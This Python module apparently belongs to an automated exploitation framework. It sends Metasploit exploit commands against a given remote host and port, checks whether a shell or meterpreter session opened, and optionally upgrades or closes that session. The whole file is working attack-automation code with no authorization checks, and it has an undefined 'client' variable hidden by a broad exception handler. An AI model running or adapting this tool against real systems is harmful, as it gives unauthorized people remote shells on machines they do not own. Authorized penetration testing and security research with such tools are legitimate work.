#!/usr/bin/env python3
import os
import time
import sys
PATH = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(PATH)
from utils import PPrint
import config
import msf_wrapper


def check_if_exploit_executed_successfully_and_returned_shell_alpha(exploit):
    client = config.getClient()
    output = {"result": False,
              "port_number": 0,
              "exploit_name": None,
              "type": None,
              "payload": None,
              "session_id": None}
    if exploit is None:
        return output
    try:
        sessions = client.sessions.list
    except AttributeError:
        return output
    for session_id in sessions.keys():
        session = sessions[str(session_id)]
        try:
            if session["via_exploit"] == "exploit/{}".format(exploit):
                output["result"] = True
                output["port_number"] = session["session_port"]
                output["exploit_name"] = session["via_exploit"]
                output["type"] = session["type"]
                output["payload"] = session["via_payload"]
                output["session_id"] = str(session_id)
                output["session_host"] = session["session_host"]
                break
        except TypeError:
            pass

    return output


def run_exploit_alpha(rhost, exploit_name, port, attempt_to_upgrade_shell=False, close_session_after_detection=True, cid=None):
    PPrint().testing_exploit("[Alpha] Testing {exploit_name} on {target}:{port}".format(exploit_name=exploit_name,
                                                                                        target=rhost,
                                                                                        port=port))

    cmd = "use exploit/{exploit_name}\n\nset RPORT {port}\n\nset RHOSTS {rhost}\n\nexploit -j".format(exploit_name=exploit_name, port=port, rhost=rhost)

    try:
        virtual_client = next(config.CLIENTS_CYCLE)
        virtual_client.write(cmd)
        time.sleep(config.TTL_FOR_EXPLOIT_VALIDATION)
        result = check_if_exploit_executed_successfully_and_returned_shell_alpha(exploit_name)
    except ValueError:
        print("Error 1")
        result = check_if_exploit_executed_successfully_and_returned_shell_alpha(None)
        pass
    except KeyError:
        print("Error 2")
        result = check_if_exploit_executed_successfully_and_returned_shell_alpha(None)
        pass
    if result["type"] == "meterpreter":
        result["meterpreter_session_id"] = result["session_id"]
    else:
        result["meterpreter_session_id"] = None

    if result["result"] and close_session_after_detection:
        try:
            #TODO: Debug
            client.sessions.session(result["session_id"]).stop()
        except Exception as e:
            pass
    if result["result"] and attempt_to_upgrade_shell:
        upgrade_shell = msf_wrapper.try_upgrade_shell(result["session_id"])
        result["upgrade_shell"] = upgrade_shell
        if upgrade_shell:
            result["meterpreter_session_id"] = msf_wrapper.get_meterpreter_session_id(result["session_host"])["session_id"]
    else:
        result["upgrade_shell"] = False
    return result
